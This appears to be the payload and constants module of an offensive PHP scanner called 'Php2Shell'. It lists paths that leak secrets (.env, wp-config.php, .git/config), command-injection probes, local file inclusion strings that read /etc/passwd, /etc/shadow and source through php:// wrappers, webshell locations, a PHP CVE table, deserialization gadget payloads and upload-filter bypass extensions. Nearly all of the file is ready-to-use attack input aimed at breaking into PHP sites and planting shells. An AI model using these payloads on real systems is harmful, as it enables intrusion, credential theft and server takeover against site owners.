# Php2Shell Color Palette — Deep Red + Electric Blue
R    = "\033[38;5;196m"
R2   = "\033[38;5;160m"
R3   = "\033[38;5;124m"
B    = "\033[38;5;27m"
B2   = "\033[38;5;33m"
B3   = "\033[38;5;39m"
W    = "\033[38;5;255m"
W2   = "\033[38;5;250m"
Y    = "\033[38;5;226m"
O    = "\033[38;5;208m"
G    = "\033[38;5;46m"
G2   = "\033[38;5;40m"
C    = "\033[38;5;51m"
M    = "\033[38;5;201m"
P    = "\033[38;5;141m"
D    = "\033[38;5;240m"
D2   = "\033[38;5;238m"
BOLD = "\033[1m"
N    = "\033[0m"
E    = N

# ── PHP Config/Info Leak Paths ─────────────────────────
PHP_INFO_PATHS = [
    "/phpinfo.php", "/info.php", "/test.php", "/i.php",
    "/php_info.php", "/phpinfo", "/info", "/test/info.php",
    "/admin/phpinfo.php", "/dev/phpinfo.php", "/php.php",
    "/server-info", "/server-status", "/status",
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/.env.old", "/.env.dev", "/.env.staging",
    "/config.php", "/configuration.php", "/wp-config.php",
    "/config.inc.php", "/settings.php", "/db.php",
    "/database.php", "/connect.php", "/conn.php",
    "/config/database.yml", "/config/secrets.yml",
    "/app/config/parameters.yml", "/.git/config",
    "/composer.json", "/composer.lock",
    "/package.json", "/.htaccess", "/.htpasswd",
    "/web.config", "/crossdomain.xml",
    "/robots.txt", "/sitemap.xml",
    "/.DS_Store", "/Thumbs.db",
    "/error_log", "/error.log", "/debug.log",
    "/access.log", "/php_error.log",
    "/.svn/entries", "/.svn/wc.db",
    "/.git/HEAD", "/.git/COMMIT_EDITMSG",
    "/.idea/workspace.xml", "/.vscode/settings.json",
    "/api/.env", "/admin/.env", "/backup/.env",
]

# ── PHP Dangerous Function Injection Payloads ──────────
INJECTION_PAYLOADS = {
    "eval": [
        "?cmd=phpinfo()", "?c=phpinfo()", "?eval=phpinfo()",
        "?code=phpinfo()", "?e=phpinfo()", "?x=phpinfo()",
        "?q=phpinfo()", "?input=phpinfo()", "?data=phpinfo()",
        "?exec=phpinfo()", "?run=phpinfo()", "?f=phpinfo()",
    ],
    "assert": [
        "?a=phpinfo()", "?assert=phpinfo()", "?test=phpinfo()",
    ],
    "system_exec": [
        "?cmd=id", "?c=id", "?exec=id", "?system=id",
        "?cmd=whoami", "?c=uname", "?run=id", "?x=id",
        "?shell=id", "?command=id", "?q=id",
    ],
    "preg_replace": [
        "?pattern=/e&replacement=phpinfo()",
        "?regex=/e&sub=phpinfo()",
    ],
    "create_function": [
        "?func=phpinfo()", "?callback=phpinfo()",
    ],
}

# ── LFI/RFI Payloads ──────────────────────────────────
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "....//....//....//....//etc/passwd",
    "../../../etc/shadow",
    "../../../proc/self/environ",
    "../../../proc/version",
    "../../../etc/hostname",
    "../../../etc/hosts",
    "../../../var/log/apache2/access.log",
    "../../../var/log/apache2/error.log",
    "../../../var/log/auth.log",
    "../../../var/log/syslog",
    "../../../tmp/sess_PHPSESSID",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "expect://id",
    "zip://shell.zip%23shell.php",
]

LFI_PARAMS = ["file", "page", "include", "path", "doc", "document",
              "folder", "root", "pg", "style", "pdf", "template",
              "php_path", "url", "dir", "action", "board", "cat",
              "conf", "download", "img", "lang", "load", "module",
              "p", "report", "r", "show", "site", "type", "view",
              "content", "layout", "mod", "open", "get", "locate",
              "resource", "sec", "filename", "redirect", "uri"]

# ── Backup File Extensions ─────────────────────────────
BACKUP_EXTENSIONS = [
    ".bak", ".old", ".orig", ".save", ".swp", ".swo", ".tmp",
    ".backup", ".copy", ".1", ".2", ".3", ".~", ".bk",
    ".sql", ".sql.gz", ".sql.bz2", ".sql.zip", ".sql.tar.gz",
    ".dump", ".db", ".sqlite", ".sqlite3",
    ".zip", ".tar", ".tar.gz", ".tgz", ".rar", ".7z", ".gz",
    ".log", ".csv", ".xml", ".json",
]

BACKUP_BASENAMES = [
    "index.php", "config.php", "wp-config.php", "configuration.php",
    "settings.php", "database.php", "db.php", "connect.php",
    "admin.php", "login.php", "upload.php", "shell.php",
    "backup", "dump", "database", "db_backup", "site_backup",
    "www", "public_html", "htdocs", "web", "app",
]

# ── Known Webshell Signatures ──────────────────────────
WEBSHELL_PATHS = [
    "/shell.php", "/cmd.php", "/c99.php", "/r57.php",
    "/b374k.php", "/wso.php", "/webshell.php", "/backdoor.php",
    "/up.php", "/upload.php", "/tmp/shell.php", "/images/shell.php",
    "/uploads/shell.php", "/wp-content/uploads/shell.php",
    "/wp-includes/shell.php", "/wp-admin/shell.php",
    "/admin/shell.php", "/temp/shell.php", "/cache/shell.php",
    "/files/shell.php", "/media/shell.php", "/assets/shell.php",
    "/s.php", "/x.php", "/a.php", "/1.php", "/0.php",
    "/hack.php", "/root.php", "/pwn.php", "/evil.php",
    "/test.php", "/info.php", "/phpinfo.php",
    "/mini.php", "/nano.php", "/tiny.php", "/micro.php",
    "/alfa.php", "/indoxploit.php", "/priv8.php",
    "/wp-content/plugins/shell.php",
    "/wp-content/themes/shell.php",
    "/.well-known/shell.php",
]

WEBSHELL_SIGNATURES = [
    "eval(", "assert(", "system(", "exec(", "passthru(",
    "shell_exec(", "popen(", "proc_open(", "pcntl_exec(",
    "base64_decode(", "gzinflate(", "gzuncompress(",
    "str_rot13(", "preg_replace(\"/e", "create_function(",
    "call_user_func(", "array_map(", "array_filter(",
    "$_GET[", "$_POST[", "$_REQUEST[", "$_COOKIE[",
    "file_get_contents(", "file_put_contents(",
    "move_uploaded_file(", "copy(", "rename(",
]

# ── PHP Version CVE Database ───────────────────────────
PHP_CVES = {
    "8.3": [
        ("CVE-2024-2756", "HIGH", "mb_encode_mimeheader infinite loop"),
        ("CVE-2024-3096", "MEDIUM", "ldap_escape filter bypass"),
    ],
    "8.2": [
        ("CVE-2024-2756", "HIGH", "mb_encode_mimeheader infinite loop"),
        ("CVE-2024-3096", "MEDIUM", "ldap_escape filter bypass"),
        ("CVE-2023-3824", "HIGH", "Phar external entity loading"),
        ("CVE-2023-3823", "CRITICAL", "Phar deserialization RCE"),
    ],
    "8.1": [
        ("CVE-2024-2756", "HIGH", "mb_encode_mimeheader infinite loop"),
        ("CVE-2023-3824", "HIGH", "Phar external entity loading"),
        ("CVE-2023-3823", "CRITICAL", "Phar deserialization RCE"),
        ("CVE-2023-3247", "HIGH", "Integer overflow in zend_strtod"),
        ("CVE-2023-0568", "CRITICAL", "crypt() DES hash collision"),
    ],
    "8.0": [
        ("CVE-2023-3824", "HIGH", "Phar external entity loading"),
        ("CVE-2023-3823", "CRITICAL", "Phar deserialization RCE"),
        ("CVE-2023-3247", "HIGH", "Integer overflow in zend_strtod"),
        ("CVE-2023-0568", "CRITICAL", "crypt() DES hash collision"),
        ("CVE-2022-31630", "HIGH", "PDO quote SQL injection"),
        ("CVE-2022-31629", "HIGH", "PostgreSQL injection"),
    ],
    "7.4": [
        ("CVE-2023-3823", "CRITICAL", "Phar deserialization RCE"),
        ("CVE-2023-3247", "HIGH", "Integer overflow in zend_strtod"),
        ("CVE-2023-0568", "CRITICAL", "crypt() DES hash collision"),
        ("CVE-2022-31630", "HIGH", "PDO quote SQL injection"),
        ("CVE-2021-21708", "CRITICAL", "Filter validation bypass"),
        ("CVE-2021-21707", "CRITICAL", "SOAP deserialization RCE"),
        ("CVE-2021-21703", "HIGH", "Filter bypass via invalid string"),
        ("CVE-2020-7071", "HIGH", "Cookie parsing overflow"),
        ("CVE-2020-7070", "CRITICAL", "get_headers() SSRF"),
    ],
    "7.3": [
        ("CVE-2021-21708", "CRITICAL", "Filter validation bypass"),
        ("CVE-2021-21707", "CRITICAL", "SOAP deserialization RCE"),
        ("CVE-2021-21703", "HIGH", "Filter bypass"),
        ("CVE-2020-7071", "HIGH", "Cookie parsing overflow"),
        ("CVE-2020-7070", "CRITICAL", "get_headers() SSRF"),
        ("CVE-2019-11043", "CRITICAL", "PHP-FPM RCE (env_path_info)"),
    ],
    "7.2": [
        ("CVE-2021-21703", "HIGH", "Filter bypass"),
        ("CVE-2020-7070", "CRITICAL", "get_headers() SSRF"),
        ("CVE-2019-11043", "CRITICAL", "PHP-FPM RCE"),
        ("CVE-2019-11042", "CRITICAL", "DirectoryIterator XSS"),
        ("CVE-2019-9024", "HIGH", "XMLRPC heap overflow"),
    ],
    "7.1": [
        ("CVE-2019-11043", "CRITICAL", "PHP-FPM RCE"),
        ("CVE-2019-9024", "HIGH", "XMLRPC heap overflow"),
        ("CVE-2019-6977", "CRITICAL", "GD heap buffer overflow"),
        ("CVE-2018-19935", "HIGH", "IMAP heap overflow"),
    ],
    "7.0": [
        ("CVE-2019-11043", "CRITICAL", "PHP-FPM RCE"),
        ("CVE-2019-9024", "HIGH", "XMLRPC heap overflow"),
        ("CVE-2019-6977", "CRITICAL", "GD heap buffer overflow"),
        ("CVE-2018-19935", "HIGH", "IMAP heap overflow"),
        ("CVE-2018-14851", "CRITICAL", "EXIF heap overflow"),
    ],
    "5.6": [
        ("CVE-2019-11043", "CRITICAL", "PHP-FPM RCE"),
        ("CVE-2018-19935", "HIGH", "IMAP heap overflow"),
        ("CVE-2018-14851", "CRITICAL", "EXIF heap overflow"),
        ("CVE-2017-12934", "CRITICAL", "iconv buffer overflow"),
        ("CVE-2016-10397", "CRITICAL", "GD integer overflow RCE"),
        ("CVE-2015-8874", "CRITICAL", "Stack overflow in virtual_file_ex"),
    ],
}

# ── Deserialization Gadget Chains ──────────────────────
DESER_PARAMS = ["data", "payload", "object", "session", "token",
                "state", "cache", "serialized", "input", "value",
                "params", "args", "config", "options", "settings"]

DESER_PAYLOADS = [
    'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
    'a:1:{s:4:"test";s:4:"test";}',
    'O:10:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"\\x00*\\x00socket";O:29:"Monolog\\Handler\\BufferHandler":7:{}}',
]

# ── Upload Test PHP Files ──────────────────────────────
UPLOAD_PHP_CONTENT = '<?php echo "PHP2SHELL_UPLOAD_TEST_".php_uname(); ?>'
UPLOAD_EXTENSIONS = [
    ".php", ".php3", ".php4", ".php5", ".php7", ".phtml",
    ".pht", ".phar", ".phps", ".pgif", ".shtml", ".htaccess",
    ".php.jpg", ".php.png", ".php.gif", ".php%00.jpg",
    ".php.", ".php ", ".php::$DATA",
]
